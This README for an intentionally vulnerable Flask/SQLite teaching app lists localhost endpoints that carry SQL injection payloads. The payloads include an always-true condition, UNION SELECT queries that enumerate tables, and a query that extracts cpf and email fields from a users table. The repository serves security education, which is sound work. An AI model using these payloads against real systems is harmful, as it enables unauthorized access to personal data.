# Flask Vulnerable to SQL Injection 💉🔓

[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
[![try/except style: tryceratops](https://img.shields.io/badge/try%2Fexcept%20style-tryceratops%20%F0%9F%A6%96%E2%9C%A8-black)](https://github.com/guilatrova/tryceratops)
[![Open in Visual Studio Code](https://open.vscode.dev/badges/open-in-vscode.svg)](https://open.vscode.dev/guilatrova/flask-sqlinjection-vulnerable)

---

The purpose of this repository is to allow us to explore an API vulnerable to SQL Injection (using Python, Flask, and SQLite).

You're free to play with it as is, but you might have more fun doing it alongside me in a blog post: https://blog.guilatrova.dev/how-sql-injection-attack-works-with-examples/.

[![Open in Gitpod](https://gitpod.io/button/open-in-gitpod.svg)](https://gitpod.io/#https://github.com/guilatrova/flask-sqlinjection-vulnerable/)

You can play with the following endpoints (considering you're running on localhost):

| Endpoint                                                                                                                                                                                                                                                                                                                      | Description                                      |
| ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------ |
| [/challenges/111.111.111-11](http://localhost:5000/challenges/111.111.111-11)                                                                                                                                                                                                                                                 | Expected usage                                   |
| [/challenges/' or '1' = '1](http://localhost:5000/challenges/'%20or%20'1'%20=%20'1)                                                                                                                                                                                                                                           | Vulnerability proof                              |
| [/challenges/' AND '1' = '2' UNION SELECT name FROM sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%](http://localhost:5000/challenges/'%20AND%20'1'%20=%20'2'%20UNION%20SELECT%20name%20FROM%20sqlite_master%20WHERE%20type%20='table'%20AND%20name%20NOT%20LIKE%20'sqlite_%)                                   | Breaks server                                    |
| [/challenges/' AND '1' = '2' UNION SELECT 'table_name', name FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite_%](http://localhost:5000/challenges/'%20AND%20'1'%20=%20'2'%20UNION%20SELECT%20'table_name',%20name%20FROM%20sqlite_master%20WHERE%20type%20=%20'table'%20AND%20name%20NOT%20LIKE%20'sqlite_%) | Queries all tables and fixes broken server       |
| [/challenges/' AND '1' = '2' UNION SELECT cpf, email FROM users; --](http://localhost:5000/challenges/'%20AND%20'1'%20=%20'2'%20UNION%20SELECT%20cpf,%20email%20FROM%20users;%20--)                                                                                                                                           | Use union select to query data from other tables |
